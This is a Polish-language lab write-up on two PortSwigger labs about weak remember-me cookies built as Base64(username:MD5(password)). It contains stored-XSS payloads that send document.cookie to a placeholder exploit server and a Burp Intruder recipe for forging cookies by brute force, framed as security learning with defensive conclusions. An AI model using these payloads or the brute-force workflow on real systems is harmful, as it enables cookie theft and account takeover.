# A04:2025 - Cryptographic Failures: laby i praktyka

## Cel

Ten plik dokumentuje praktykę wykonaną dla A04:2025 - Cryptographic Failures.

Celem nie było tylko rozwiązanie dwóch labów, ale zrozumienie, dlaczego słaby projekt tokenu, słabe hashowanie i cookies czytelne dla przeglądarkowego JavaScript mogą tworzyć realne ryzyko account takeover.

## Ukończona praktyka

### Lab 1: PortSwigger - Offline Password Cracking

**Platforma:** PortSwigger Web Security Academy  
**Lab:** Offline password cracking  
**Kategoria:** A04:2025 - Cryptographic Failures  
**Powiązane tematy:** XSS, bezpieczeństwo cookies, słaby projekt tokenu remember-me  
**Status:** ukończone po guided review

Link zewnętrzny:

- https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking

### Co ćwiczyłem

Zalogowałem się jako zwykły użytkownik i sprawdziłem request w Burp Suite.

Request zawierał persistent login cookie:

```http
Cookie: session=<redacted-session>; stay-logged-in=<redacted-base64-value>
```

Po zdekodowaniu wartości `stay-logged-in` z Base64 cookie ujawniło strukturę podobną do:

```text
wiener:<md5-password-hash>
```

To wskazywało, że format cookie prawdopodobnie wyglądał tak:

```text
Base64(username:MD5(password))
```

Pierwsza ważna lekcja:

> Base64 nie jest szyfrowaniem. To tylko encoding.

### Co było podatne

Cookie remember-me było słabe, ponieważ zawierało przewidywalną wartość pochodzącą od hasła.

Aplikacja nie wydawała losowego tokenu walidowanego po stronie serwera. Zamiast tego cookie zawierało:

```text
username + MD5(password)
```

To pozwalało zdekodować wartość, zrozumieć ją i atakować offline.

### Łańcuch podatności

Ten lab był wartościowy, bo nie był jednopunktowym problemem. To był łańcuch:

```text
Słaby projekt cookie remember-me
    -> Base64(username:MD5(password))
    -> cookie czytelne dla JavaScript, bo brakowało HttpOnly
    -> stored XSS w komentarzu blogowym
    -> przeglądarka ofiary wysłała document.cookie do exploit server
    -> atakujący zdekodował stay-logged-in cookie ofiary
    -> atakujący złamał hash MD5 offline
    -> atakujący zalogował się jako ofiara
```

### Ważna obserwacja o cookie

Cookie `stay-logged-in` nie miało flagi `HttpOnly`.

To miało znaczenie, ponieważ JavaScript mógł je odczytać przez:

```js
document.cookie
```

Przez to cookie było możliwe do kradzieży przez stored XSS.

### Debugowanie exploit server

Na początku miałem problem, bo log exploit server nie pokazywał oczekiwanej wartości cookie.

Testowałem payload mniejszymi krokami.

Najpierw potwierdziłem, że stored XSS się wykonuje, wysyłając prosty ping do exploit server:

```html
<script>
new Image().src='https://<exploit-server>/exploit?ping=1';
</script>
```

Kiedy request `/exploit?ping=1` pojawił się w access log, wiedziałem, że payload XSS się wykonuje.

Potem zmieniłem payload tak, aby wysyłał `document.cookie`:

```html
<script>
new Image().src='https://<exploit-server>/exploit?cookie=' + encodeURIComponent(document.cookie);
</script>
```

Access log pokazał request z przeglądarki ofiary zawierający wartość cookie.

Wartości wrażliwe są w tych notatkach celowo zredagowane.

### Czego się nauczyłem

- Base64 jest odwracalnym encoding, nie encryption.
- MD5 jest zbyt szybki i słaby dla ochrony związanej z hasłami.
- Cookie zawierające `username:MD5(password)` jest przewidywalne i niebezpieczne.
- Brak `HttpOnly` może zamienić XSS w kradzież cookie.
- Stored XSS może eksfiltrować cookies czytelne dla JavaScript.
- Słaby token remember-me może prowadzić do offline cracking i account takeover.

---

### Lab 2: PortSwigger - Brute-forcing a Stay-Logged-In Cookie

**Platforma:** PortSwigger Web Security Academy  
**Lab:** Brute-forcing a stay-logged-in cookie  
**Kategoria:** A04:2025 - Cryptographic Failures  
**Powiązane tematy:** Burp Intruder, słabe generowanie tokenów, MD5, Base64  
**Status:** ukończone po guided review

Link zewnętrzny:

- https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie

### Co ćwiczyłem

Drugi lab używał tego samego słabego wzorca cookie:

```text
stay-logged-in = Base64(username:MD5(password))
```

Tym razem nie musiałem kraść cookie ofiary.

Ponieważ znałem format, mogłem wygenerować candidate cookies dla username ofiary:

```text
Base64(carlos:MD5(candidate-password))
```

Użyłem Burp Intruder, aby przekształcić listę haseł w prawidłowe wartości cookie-kandydatów.

## Workflow Burp Intruder: MD5 + prefix + Base64

To była jedna z najbardziej praktycznych części laba.

### Cel

Wygenerować wiele candidate cookies w formacie:

```text
Base64(carlos:MD5(candidate-password))
```

### 1. Przygotowanie requestu

Wysłałem do Burp Intruder request podobny do:

```http
GET /my-account?id=carlos HTTP/2
Host: <lab-host>
Cookie: stay-logged-in=PLACEHOLDER
```

Usunąłem normalne cookie `session`, aby request opierał się tylko na cookie `stay-logged-in`.

### 2. Ustawienie payload position

W Burp Intruder zaznaczyłem tylko wartość cookie:

```http
Cookie: stay-logged-in=§PLACEHOLDER§
```

### 3. Dodanie wordlisty haseł

Payload list zawierała hasła-kandydatów.

Przykładowa struktura:

```text
<password-1>
<password-2>
<password-3>
```

### 4. Dodanie payload processing rules

Dla każdego hasła-kandydata Intruder przekształcał payload tak:

```text
candidate password
    -> MD5(candidate password)
    -> add prefix: carlos:
    -> Base64 encode final value
```

Reguły payload processing w Burp:

```text
1. Hash: MD5
2. Add prefix: carlos:
3. Encode: Base64
```

Przykład ze zredagowanymi wartościami:

```text
<candidate-password>
    -> <md5-hash>
    -> carlos:<md5-hash>
    -> <base64-cookie-value>
```

### 5. Rozpoznanie poprawnej odpowiedzi

W wynikach Intrudera porównywałem:

- status code,
- długość odpowiedzi,
- body odpowiedzi.

Poprawny request zwracał stronę konta Carlosa:

```html
<p>Your username is: carlos</p>
```

To pokazało, że wygenerowane cookie remember-me zostało zaakceptowane przez aplikację.

### Czego się nauczyłem

Wcześniej nie używałem Burp Intruder payload processing w ten sposób.

Ten lab pomógł mi zrozumieć, że Intruder potrafi więcej niż tylko podmieniać wartość wordlistą. Może przekształcać każdy payload przed wysłaniem.

W tym przypadku każde hasło było przekształcane do:

```text
Base64(username:MD5(password))
```

To działało tylko dlatego, że projekt tokenu w aplikacji był przewidywalny.

## Różnica między dwoma labami

### Lab 1: Offline Password Cracking

Lab 1 był większym łańcuchem podatności:

```text
słabe cookie remember-me
+ brak HttpOnly
+ stored XSS
+ exfiltracja cookie
+ offline cracking
+ account takeover
```

### Lab 2: Brute-Forcing a Stay-Logged-In Cookie

Lab 2 skupiał się bardziej bezpośrednio na słabym projekcie tokenu:

```text
znany format cookie
+ hash hasła MD5
+ encoding Base64
+ Burp Intruder payload processing
+ wygenerowane poprawne cookie
+ dostęp do konta
```

Oba laby dobrze mapują się na A04, bo głównym problemem był słaby projekt kryptograficzny/tokenowy.

## Z czym miałem trudność

Podczas tych labów pojawiło się kilka praktycznych pytań:

- Czy Burp ma Base64 encode/decode?
- Co właściwie oznacza zdekodowana wartość cookie?
- Czy hash bazuje na username czy na password?
- Dlaczego Base64 nie jest encryption?
- Dlaczego `HttpOnly=false` ma znaczenie?
- Dlaczego log exploit server najpierw nie pokazywał cookie?
- Czy exploit URL powinien zawierać `/exploit`?
- Jak użyć Burp Intruder, aby hashować każdy payload MD5 i potem kodować go Base64?

To było przydatne, bo zmusiło mnie do debugowania łańcucha krok po kroku, zamiast tylko kopiować finalny payload.

## Najważniejsze wnioski

1. Base64 to encoding, nie encryption.
2. MD5 jest słaby i zbyt szybki dla ochrony związanej z hasłami.
3. Cookie remember-me nie powinno zawierać `username:passwordHash`.
4. Brak `HttpOnly` sprawia, że cookies są czytelne dla JavaScript.
5. XSS może zamienić browser-readable cookie w account takeover.
6. Burp Intruder może przekształcać payloady przez hashing, prefixy i encoding.
7. Bezpieczne tokeny remember-me powinny być losowe, wysokiej entropii, walidowane po stronie serwera, wygasające i odwoływalne.

Dłuższe refleksje i real-world review angle są w:

- [A04 learning notes](05-learning-notes.md)
- [A04 overview](01-overview.md)
- [A04 checklista](03-checklist.md)
- [A04 testy regresji](04-regression-tests.md)
- [Przykładowe znalezisko weak remember-me cookie](security-findings/01-example-finding.md)

## Powiązane notatki

- [Authentication Bypass / Username Enumeration](../../key-web-vulnerabilities/01-authentication-bypass-username-enumeration/README.md)
- [Cross-Site Scripting](../../key-web-vulnerabilities/03-cross-site-scripting-xss/README.md)
- [CSRF + SameSite Cookies](../../key-web-vulnerabilities/05-csrf-samesite-cookies/README.md)
- [HTTP, Request/Response i podstawy Auth](../../fundamentals/01-http-request-response-auth.md)
- [Burp Suite, Proxy i podstawy Repeatera](../../fundamentals/02-burp-suite-proxy-repeater.md)
